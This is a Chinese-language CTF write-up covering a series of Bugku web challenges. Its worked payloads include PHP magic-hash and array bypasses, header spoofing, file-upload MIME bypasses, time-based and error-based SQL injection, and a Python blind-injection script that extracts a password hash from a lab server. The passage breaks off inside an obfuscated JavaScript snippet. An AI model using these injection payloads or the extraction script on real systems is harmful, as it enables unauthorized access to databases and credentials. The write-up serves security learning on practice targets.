<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<div class="hljs"><pre><code class="hljs stylus">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaroZmOk'</span>)</span></span>  
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaK1STfY'</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaO8zKZF'</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aa3OFF9m'</span>)</span></span></code></pre></div>



<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>见到题目就想到了<code>x-forwarded-for</code>，本地地址可以使用IP:127.0.0.1</p>
<p>可以使用google浏览器的插件<img src="/2020/09/10/bugku1/xff.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/10/bugku1/localhost.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/10/bugku1/lc.png" srcset="/img/loading.gif" alt></p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-string">'flag.php'</span>);
$_GET[<span class="hljs-string">'id'</span>] = urldecode($_GET[<span class="hljs-string">'id'</span>]);
$flag = <span class="hljs-string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'uname'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>])) &#123;
    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'uname'</span>] == $_POST[<span class="hljs-string">'passwd'</span>])

        <span class="hljs-keyword">print</span> <span class="hljs-string">'passwd can not be uname.'</span>;

    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'uname'</span>]) === sha1($_POST[<span class="hljs-string">'passwd'</span>])&amp;($_GET[<span class="hljs-string">'id'</span>]==<span class="hljs-string">'margin'</span>))

        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);

    <span class="hljs-keyword">else</span>

        <span class="hljs-keyword">print</span> <span class="hljs-string">'sorry!'</span>;

&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>首先看一下要传入哪些变量</p>
<p>get:id uname</p>
<p>post:passwd</p>
<p>id需要进行一次urldecode，解码的值为margin</p>
<p>uname与passwd不相同，但是sha1值要相同，并且是严格相等 ===，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs angelscript">urlencode(margin)=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E
uname[]=<span class="hljs-number">1</span>
passwd[]=<span class="hljs-number">2</span>

GET: id=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E&amp;uname[]=<span class="hljs-number">1</span>
POST:passwd[]=<span class="hljs-number">2</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" srcset="/img/loading.gif" alt="raoguo.png"></p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
extract($_GET);
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($ac))
&#123;
$f = trim(file_get_contents($fn));
<span class="hljs-keyword">if</span> ($ac === $f)
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;This is flag:"</span> .<span class="hljs-string">" $flag&lt;/p&gt;"</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p><strong>extract</strong>函数作用</p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>extract — 从数组中将变量导入到当前的符号表</p>
<p>说明</p>
<p>extract ( array <code>&amp;$array</code> [, int <code>$flags</code> = EXTR_OVERWRITE [, string <code>$prefix</code> = <strong><code>NULL</code></strong> ]] ) : int</p>
<p>本函数用来将变量从数组中导入到当前的符号表中。</p>
<p>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</p>
<p><strong>trim</strong></p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>trim — 去除字符串首尾处的空白字符（或者其他字符）</p>
<p>说明</p>
<p>trim ( string <code>$str</code> [, string <code>$character_mask</code> = “ \t\n\r\0\x0B” ] ) : string</p>
<p>此函数返回字符串 <code>str</code> 去除首尾空白字符后的结果。如果不指定第二个参数，<strong>trim()</strong> 将去除这些字符：</p>
<ul>
<li>“ “ (ASCII <code>32</code> (<code>0x20</code>))，普通空格符。</li>
<li>“\t” (ASCII <code>9</code> (<code>0x09</code>))，制表符。</li>
<li>“\n” (ASCII <code>10</code> (<code>0x0A</code>))，换行符。</li>
<li>“\r” (ASCII <code>13</code> (<code>0x0D</code>))，回车符。</li>
<li>“\0” (ASCII <code>0</code> (<code>0x00</code>))，空字节符。</li>
<li>“\x0B” (ASCII <code>11</code> (<code>0x0B</code>))，垂直制表符。</li>
</ul>
<p><strong>file_get_contents</strong></p>
<p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7)</p>
<p>file_get_contents — 将整个文件读入一个字符串</p>
<p>代码的大致含义就是</p>
<p>get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac===$f则拿到flag</p>
<p>这里需要利用php的伪协议写入内容 php://input</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span> ac=<span class="hljs-number">111</span><span class="hljs-variable">&amp;fn</span>=php:<span class="hljs-comment">//input</span>
<span class="hljs-symbol">POST:</span> <span class="hljs-number">111</span></code></pre></div>



<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>题目网站崩了</p>
<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>文件上传</p>
<p>首先先上传一个图片文件，上传成功了并返回保存路径</p>
<p>再上传一个php的文件，提示<code>Invalid file</code></p>
<p>上传.htaccess, .user.ini都提示<code>you got it</code></p>
<p>两种提示不一样猜测可能存在后缀黑名单和文件类型检测。</p>
<p>上传一个php5文件并bp抓包修改MIME(Content-Type)为 image/.jpeg还是提示invalid file </p>
<p><img src="https://i.loli.net/2020/11/23/FgbfWmJIoNxpw7V.png" srcset="/img/loading.gif" alt="getshell1.png"></p>
<p>再修改请求头部的Content-Type，利用大小写绕过，成功拿到flag</p>
<p><img src="https://i.loli.net/2020/11/23/w2bYAuHngShyXCI.png" srcset="/img/loading.gif" alt="getshell2.png"></p>
<p>考察知识点：</p>
<p><strong>请求中的Content-Type</strong></p>
<p>在请求中 (如POST 或 PUT)，Content-Type字段用于客户端告诉服务器实际发送的数据类型。当你发送一个HTTP的POST请求时，需要设置请求头中的Content-Type字段，告诉服务端你发送的数据是什么类型的。</p>
<p><strong>设置请求头中的Content-Type</strong></p>
<p>当客户端向服务端发起HTTP的POST请求时，需要告诉服务端，我们发送的数据类型，方便服务端去解析数据。如果你不设置，那么服务端可能无法处理你的请求。</p>
<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>提示了insert into注入</p>
<p>并给出了源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIp</span><span class="hljs-params">()</span></span>&#123;
$ip = <span class="hljs-string">''</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>]))&#123; <span class="hljs-comment">//判断是否存在xxf</span>
$ip = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];		<span class="hljs-comment">//存在则优先使用xxf</span>
&#125;<span class="hljs-keyword">else</span>&#123;
$ip = $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>];				<span class="hljs-comment">//remote_addr	</span>
&#125;
$ip_arr = explode(<span class="hljs-string">','</span>, $ip);				<span class="hljs-comment">//过滤 ,</span>
<span class="hljs-keyword">return</span> $ip_arr[<span class="hljs-number">0</span>];

&#125;

$host=<span class="hljs-string">"localhost"</span>;
$user=<span class="hljs-string">""</span>;
$pass=<span class="hljs-string">""</span>;
$db=<span class="hljs-string">""</span>;

$connect = mysql_connect($host, $user, $pass) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Unable to connect"</span>);<span class="hljs-comment">//连接数据库</span>

mysql_select_db($db) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Unable to select database"</span>);

$ip = getIp();
<span class="hljs-keyword">echo</span> <span class="hljs-string">'your ip is :'</span>.$ip;
$sql=<span class="hljs-string">"insert into client_ip (ip) values ('$ip')"</span>; <span class="hljs-comment">//注入点</span>
mysql_query($sql);
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，并且没有回显所以要使用基于时间的盲注</p>
<p>代替if的注入语句如下</p>
<div class="hljs"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> xxx <span class="hljs-keyword">then</span> xxx <span class="hljs-keyword">else</span> xxx <span class="hljs-keyword">end</span>;</code></pre></div>

<p>所以要构造的注入语句为</p>
<div class="hljs"><pre><code class="hljs sql">11'+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-keyword">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span></code></pre></div>





<h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>网址打不开</p>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>tips</p>
<blockquote>
<p>本题有2个flag<br>flag均为小写<br>flag格式 flag{}</p>
</blockquote>
<p>看到题目提示，应该是二次注入</p>
<p>url中存在id参数，再id参数后加 ‘后页面报错，再加上#后显示 <code>There is nothing</code></p>
<p>输入 id=1’or 1=1–+ 报错</p>
<p>但是输入id=1’oorr 1=1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。</p>
<div class="hljs"><pre><code class="hljs matlab"><span class="hljs-number">1</span>'^(<span class="hljs-built_in">length</span>(<span class="hljs-string">'union'</span>)!=<span class="hljs-number">0</span>)--+
页面显示错误正常说明<span class="hljs-built_in">length</span>(<span class="hljs-string">'union'</span>)!=<span class="hljs-number">0</span>是错的，即<span class="hljs-built_in">length</span>(<span class="hljs-string">'union'</span>)=<span class="hljs-number">0</span>，说明union替换为空了
其他关键词的测试也类似</code></pre></div>

<p>开始注入</p>
<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-string">' ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span>
<span class="hljs-string"></span>
<span class="hljs-string">database:flag1,hint</span>
<span class="hljs-string"></span>
<span class="hljs-string">-1'</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> infoorrmation_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'flag1'</span><span class="hljs-comment">--+</span>
<span class="hljs-keyword">table</span>:flag1,address
<span class="hljs-number">-1</span><span class="hljs-string">' ununionion seselectlect 1,group_concat(flag1) from flag1 --+</span>
<span class="hljs-string">usOwycTju+FTUUzXosjr 解码为：好吧你会SQL注入</span>
<span class="hljs-string">-1'</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(address) <span class="hljs-keyword">from</span> flag1 <span class="hljs-comment">--+</span>
拿到下一关的地址</code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/uMT6Q7oaNHJEcbv.png" srcset="/img/loading.gif" alt="sqls-1.png"></p>
<p>同样存在一个注入点id，加单引号发现提示了报错信息，很明显是报错注入</p>
<p><img src="https://i.loli.net/2020/11/23/KBepFMZsYRPHaW8.png" srcset="/img/loading.gif" alt="sqls-2.png"></p>
<p>报错注入一般是固定的模板</p>
<p>下面使用updatexml()进行注入</p>
<blockquote>
<p>函数语法：updatexml(XML_document, XPath_string, new_value);</p>
<p>适用版本: 5.1.5+<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
<p>我们通常在第二个xpath参数填写我们要查询的内容。</p>
</blockquote>
<p>payload</p>
<div class="hljs"><pre><code class="hljs sql">1' and updatexml(1,concat('~',(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-string">'~'</span>),<span class="hljs-number">3</span>) %<span class="hljs-number">23</span>
<span class="hljs-keyword">database</span>:~<span class="hljs-keyword">class</span>,flag2~
 
?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">' and updatexml(1,concat('</span>~<span class="hljs-string">',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>flag2<span class="hljs-string">'),'</span>~<span class="hljs-string">'),3) %23</span>
<span class="hljs-string">table:~flag2,address~</span>
<span class="hljs-string"># 查数据</span>
<span class="hljs-string">?id=1'</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">'0x7e'</span>,(<span class="hljs-keyword">select</span> flag2 <span class="hljs-keyword">from</span> flag2),<span class="hljs-string">'0x7e'</span>),<span class="hljs-number">3</span>) %<span class="hljs-number">23</span>
 拿到真正的flag</code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/QwtPgsAriuMOGLB.png" srcset="/img/loading.gif" alt="sqls-flag.png"></p>
<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>题目给了源码分析可知是一个加密过程，并且给了加密后的字符串，所以写出解密脚本即可</p>
<p>加密后的数据为</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA</span>=</code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span><span class="hljs-params">($data,$key)</span></span>
<span class="hljs-function"></span>&#123;
    $key = md5(<span class="hljs-string">'ISCC'</span>);
    $x = <span class="hljs-number">0</span>;
    $len = strlen($data);
    $klen = strlen($key);
    <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $len; $i++) &#123; 
        <span class="hljs-keyword">if</span> ($x == $klen)
        &#123;
            $x = <span class="hljs-number">0</span>;
        &#125;
        $char .= $key[$x];
        $x+=<span class="hljs-number">1</span>;
    &#125;
    <span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>; $i &lt; $len; $i++) &#123;
        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="hljs-number">128</span>);
    &#125;
    <span class="hljs-keyword">return</span> base64_encode($str);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>解密脚本如下</p>
<div class="hljs"><pre><code class="hljs php">

<span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span><span class="hljs-params">($str)</span></span>
<span class="hljs-function"></span>&#123;
    $key = md5(<span class="hljs-string">'ISCC'</span>);  <span class="hljs-comment">// 对密钥进行md5加密</span>
    $x=<span class="hljs-number">0</span>;
    $str=base64_decode($str); <span class="hljs-comment">//对加密后的字符串base64解码</span>
    $len=strlen($str);     
    $klen=strlen($key);

    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len;$i++)   <span class="hljs-comment">//计算出char字符数组，用于最后的减操作</span>
    &#123;
        <span class="hljs-keyword">if</span>($x==$klen)
        &#123;
            $x=<span class="hljs-number">0</span>;
        &#125;
        $char.=$key[$x];
        $x+=<span class="hljs-number">1</span>;
    &#125;
    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len;$i++)
    &#123;
        $data.=chr((ord($str[$i])-ord($char[$i])+<span class="hljs-number">128</span>)%<span class="hljs-number">128</span>);  <span class="hljs-comment">//加上128为了防止出现负数。</span>
    &#125;
    <span class="hljs-keyword">return</span> $data;
&#125;
<span class="hljs-keyword">echo</span>(decode(<span class="hljs-string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>));
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/23/DEs3N8y7ngdKovb.png" srcset="/img/loading.gif" alt="encode.png"></p>
<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>网址打不开</p>
<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>给了提示hint，猜测可能是要提交的参数，get提交hint,显示源码</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;?php
error_reporting(0);
include_once(&quot;flag.php&quot;);
$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];  &#x2F;&#x2F;含cookie 可能需要抓包修改cookie
if(isset($_GET[&#39;hint&#39;]))&#123;
    show_source(__FILE__);
&#125;
elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;如果反序列化后的$cookie&#x3D;&#x3D;&#x3D;$KEY 拿到flag
&#123;                                           
    echo &quot;$flag&quot;;
&#125;
else &#123;
?&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;
&lt;title&gt;Login&lt;&#x2F;title&gt;
&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
&lt;br&gt;
&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;
  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;
    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;
    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;
    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;
  &lt;&#x2F;form&gt;
&lt;&#x2F;div&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;

&lt;?php
&#125;
$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;
?&gt;</code></pre></div>

<p>代码审计完后思路很简单就是cookie注入，而且$KEY的值下面也已经给了</p>
<p>直接构造</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">21</span>:<span class="hljs-string">"ISecer:www.isecer.com"</span><span class="hljs-comment">;</span></code></pre></div>

<p>但是会发现并没有显示flag，这是因为这题给出的$KEY是迷惑人的，下面这段php代码与上面没关系，就是说明上面代码中$KEY为NULL</p>
<p>所以真正的payload：</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">0</span>:<span class="hljs-string">""</span><span class="hljs-comment">;</span></code></pre></div>

<p>请求头</p>
<div class="hljs"><pre><code class="hljs groovy">GET <span class="hljs-regexp">/flagphp/</span> HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-string">Host:</span> <span class="hljs-number">123.206</span><span class="hljs-number">.87</span><span class="hljs-number">.240</span>:<span class="hljs-number">8002</span>
User-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46.0</span>
<span class="hljs-string">Accept:</span> text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,*/</span>*;q=<span class="hljs-number">0.8</span>
Accept-<span class="hljs-string">Language:</span> zh-CN,zh;q=<span class="hljs-number">0.8</span>,en-US;q=<span class="hljs-number">0.5</span>,en;q=<span class="hljs-number">0.3</span>
<span class="hljs-string">DNT:</span> <span class="hljs-number">1</span>
<span class="hljs-string">Cookie:</span> ISecer=<span class="hljs-string">s:</span><span class="hljs-number">0</span>:<span class="hljs-string">""</span>;
<span class="hljs-string">Connection:</span> close</code></pre></div>



<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>提示：</p>
<blockquote>
<p>全都tm过滤了绝望吗？</p>
<p>提示 !,!=,=,+,-,^,%</p>
</blockquote>
<p>带有过滤的sql注入</p>
<p>先测试一下过滤哪些字符</p>
<p><img src="https://i.loli.net/2020/11/25/zAG3jeME7Ocs2Wt.png" srcset="/img/loading.gif" alt="sql2-2.png"></p>
<p>测试发现  or ，and,#,–+,union,from ,database(),这些常用字符都被过滤了，没有过滤的字符只有提示中的字符</p>
<p>测试还可以发现，当uname=admin&amp;passwd=111时提示的password error ,</p>
<p>但是当uname=adm&amp;passwd=111时提示username error，这也是盲注的一种了。</p>
<p>当uname=admin’-1-‘&amp;passwd=11时为false</p>
<p>当uname=admin’-0-‘&amp;passwd=1时为true</p>
<p>所以猜测sql查询语句为</p>
<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; select * from users where username&#x3D;$username;</code></pre></div>

<h3 id="尝试构造注入语句"><a href="#尝试构造注入语句" class="headerlink" title="尝试构造注入语句"></a>尝试构造注入语句</h3><div class="hljs"><pre><code class="hljs lisp">ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;50</code></pre></div>

<p>上名的语句可以放到admin’-1’&amp;passwd=11中 1的位置</p>
<p>但是还是存在很多问题，因为题目过滤了空格，逗号，多次修改后勾出下面的语句</p>
<div class="hljs"><pre><code class="hljs mysql">ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0</code></pre></div>

<p>reverse 为字符串反转函数</p>
<p><img src="https://i.loli.net/2020/11/25/fAOErbn2JSWxgPM.png" srcset="/img/loading.gif" alt="sql2-1.png"></p>
<p>确定盲注的判断条件</p>
<p>当上面的语句成立时返回的是 username error </p>
<p><img src="https://i.loli.net/2020/11/25/7NWBSIEGUTqiMKt.png" srcset="/img/loading.gif" alt="sql2-4.png"></p>
<p>不成立时返回的是password  error  </p>
<p><img src="https://i.loli.net/2020/11/25/5wdsrDZSipRENB3.png" srcset="/img/loading.gif" alt="sql-3.png"></p>
<p>编写脚本</p>
<p>因为密码保存时一般是以 md5形式保存，所以爆破密码的长度应该为32位</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"http://123.206.87.240:8007/web2/login.php"</span>
cookie =&#123;<span class="hljs-string">'PHPSESSID'</span>:<span class="hljs-string">'r3rln64ialiqjnefpa6qu5a0t513t8rs'</span>&#125;
password = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789abcdef'</span>:
        payload = <span class="hljs-string">"admin'-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-'"</span>.format(i,ord(j))
        data=&#123;<span class="hljs-string">'uname'</span>:payload,<span class="hljs-string">'passwd'</span>:<span class="hljs-string">"111"</span>&#125;
        res = requests.post(url=url,cookies=cookie,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"username"</span> <span class="hljs-keyword">in</span> res.text:
            password +=j
            <span class="hljs-comment">#print(password)</span>
            <span class="hljs-keyword">break</span>
print(password)</code></pre></div>

<p><img src="https://i.loli.net/2020/11/25/uhOXQkE5VNt623H.png" srcset="/img/loading.gif" alt="sql2-5.png"></p>
<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">005</span>b81fd960f61505237dbb7a3202910
md5在线解码后为admin123</code></pre></div>

<p>登录后即可用ls命令，就可以拿到flag</p>
<p>这题使用的是弱密码，也可以直接使用bp的爆破模块进行密码爆破</p>
<p>参考叶师傅：<a href="https://xz.aliyun.com/t/2583" target="_blank" rel="noopener">https://xz.aliyun.com/t/2583</a></p>
<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>进入页面是一个博客的页面，有搜索功能，没有思路</p>
<p>于是扫描目录</p>
<p><img src="https://i.loli.net/2020/11/25/eMWjLmnHahPJXk9.png" srcset="/img/loading.gif" alt="blog.png"></p>
<p>但是没有有用的信息，查看网上的wp，发现phpmyadmin被人删了，所以没法做</p>
<h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>tips:不要一次就放弃</p>
<p>是个登录页面，但是没有账号，想着先注册一个，但是发现提示数据库连接失败，所以应该不是这个方法</p>
<p>那就万事不觉扫以下</p>
<p>还真有发现</p>
<p>扫到三个目录</p>
<p>login.php</p>
<p>register.php</p>
<p>show.php</p>
<p>访问show.php,拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/9JLhgS4HveW7Yyk.png" srcset="/img/loading.gif" alt="trim.png"></p>
<h2 id="login2-SKCTF-login3-文件上传2-login4"><a href="#login2-SKCTF-login3-文件上传2-login4" class="headerlink" title="login2(SKCTF)  login3  文件上传2  login4"></a>login2(SKCTF)  login3  文件上传2  login4</h2><p>题目都挂了</p>
<h2 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h2><p>提示:学会如来神掌就可以打败他了吧</p>
<p>进入题目发现还真像是游戏的界面</p>
<p>包含属性 练功 商店 赚钱 讨伐 退出 几个页面</p>
<p><img src="https://i.loli.net/2020/11/25/YSI7zwLur5nCdca.png" srcset="/img/loading.gif" alt="mt-1.png"></p>
<p>其中练功可以提高自身属性，也就是武力值，赚钱每次只能赚100，而商店中有一些提高武力值的武器，其中就有如来神掌，但是价格也高的惊人，肯定不是通过赚钱的方法挣到那么多钱。所以思路就是通过漏洞修改金钱数量之后购买如来神掌，打败魔头拿到flag</p>
<p><strong>查看源码</strong>    </p>
<p>在wulin.php中可以看到三个js文件</p>
<p><img src="https://i.loli.net/2020/11/25/Qkqr6FwmHVndU3s.png" srcset="/img/loading.gif" alt="mt-2.png"></p>
<div class="hljs"><pre><code class="hljs js"><span class="hljs-comment">//script.js 在线格式化后的结果</span>


<span class="hljs-built_in">eval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, r</span>) </span>&#123;
	e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) </span>&#123;
